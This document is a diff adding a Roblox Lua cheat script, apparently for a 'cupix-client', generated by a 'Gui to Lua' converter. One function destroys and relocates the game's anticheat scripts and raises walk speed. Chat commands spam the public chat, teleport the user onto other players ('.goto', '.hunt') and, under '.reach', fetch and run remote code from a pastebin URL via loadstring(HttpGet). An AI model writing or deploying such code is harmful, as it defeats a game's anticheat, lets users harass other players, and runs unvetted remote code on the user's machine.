@@ -1,0 +1,127 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local flexyourtimegui = Instance.new("ScreenGui")
+
+--Properties:
+
+flexyourtimegui.Name = "flex-your-time-gui"
+flexyourtimegui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+flexyourtimegui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+-- Scripts:
+
+local function EIUX_fake_script() -- flexyourtimegui.anticheat-disabler 
+	local script = Instance.new('LocalScript', flexyourtimegui)
+
+	
+	local GiftsFolder = game:GetService("Workspace").Gifts
+	local MainAc = game.Players.LocalPlayer.Character.Anticheat
+	local StarterPlayerAC = game.StarterPlayer.StarterCharacterScripts.Anticheat
+	
+	function ChangeMainAcPath()
+		MainAc.Parent = GiftsFolder
+	end
+	function RemoveStarterPlayerAC()
+		StarterPlayerAC:Destroy()
+		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 50
+	end
+	ChangeMainAcPath()
+	RemoveStarterPlayerAC()
+	wait(1)
+	print('Removed StarterPlayer AntiCheat, Moved Main AntiCheat Path')
+	print('Enabled Ban Saver')
+	wait()
+	local NewAntiCheatPath = game:GetService("Workspace").Gifts.Anticheat
+	NewAntiCheatPath:Destroy()
+	print('Removed Main AntiCheat')
+	while true do wait()
+		if game.Players.LocalPlayer.Character.Humanoid.Health == 0 then
+			local service = game:GetService("TeleportService")
+			local player = game.Players.LocalPlayer
+			local PlaceID = "5278850819"
+			service:Teleport(PlaceID, player)
+		end
+	end
+end
+coroutine.wrap(EIUX_fake_script)()
+local function BBPNWS_fake_script() -- flexyourtimegui.chat commands 
+	local script = Instance.new('LocalScript', flexyourtimegui)
+
+	game.Players.LocalPlayer.Chatted:Connect(function(message)
+		_G.SpamChat = false
+		local function getplrname(String)
+			if not String then return end
+			local Yes = {}
+			for _, Player in ipairs(game.Players:GetPlayers()) do
+				if string.lower(Player.Name):match(string.lower(String)) or string.lower(Player.DisplayName):match(string.lower(String)) then
+					table.insert(Yes, Player)
+				end
+			end
+			if #Yes > 0 then
+				return Yes[1]
+			elseif #Yes < 1 then
+				return nil
+			end
+		end
+		local messagesplit = message:split(" ")
+		if message == ".spawn" then
+			local Time = 5
+			local CFrame1 = CFrame.new(-0.5, 2.49995422, -0.5, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+			local T = game:GetService("TweenService"):Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(Time), {CFrame = CFrame1})
+			T:Play()
+		end
+		if message == ".spam" then
+			_G.SpamChat = true
+			while _G.SpamChat == true do wait()
+				local A_1 = "cupix-client on top! cupix-client on top! cupix-client on top!"
+				local A_2 = "All"
+				local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+				Event:FireServer(A_1, A_2)
+			end
+		end
+		if message == ".reach" then
+			loadstring(game:HttpGet(('https://pastebin.com/raw/UkCcMZJR'),true))()
+		end
+		if message == ".stopspam" then
+			_G.SpamChat = false
+		end
+		if messagesplit[1] == ".goto" then
+			local name = messagesplit[2]
+			local playerName = getplrname(name)
+			if playerName then
+				local p3 = game.Players.LocalPlayer.Character.HumanoidRootPart
+				local p4 = tostring(playerName)
+				local pos = p3.CFrame
+				local CFrame1 = game.Players[p4].Character.HumanoidRootPart.CFrame
+				local Time = 1.5
+				local T = game:GetService("TweenService"):Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(Time), {CFrame = CFrame1})
+				T:Play()
+			end
+		end
+		if message == ".hunt" then
+			_G.Spam = true
+			local player = game.Players.LocalPlayer
+			local players = game:GetService('Players')
+			while _G.Spam == true do wait() 
+				for i,v in pairs(game.Players:GetChildren()) do
+					if v.UserId == player.UserId then 
+						print''
+					else
+						local p3 = game.Players.LocalPlayer.Character.HumanoidRootPart
+						local p4 = tostring(v)
+						local pos = p3.CFrame
+						local CFrame1 = game.Players[p4].Character.HumanoidRootPart.CFrame
+						local Time = 1.5
+						local T = game:GetService("TweenService"):Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(Time), {CFrame = CFrame1})
+						T:Play()
+					end
+				end
+			end
+		end
+	end)
+	
+end
+coroutine.wrap(BBPNWS_fake_script)()
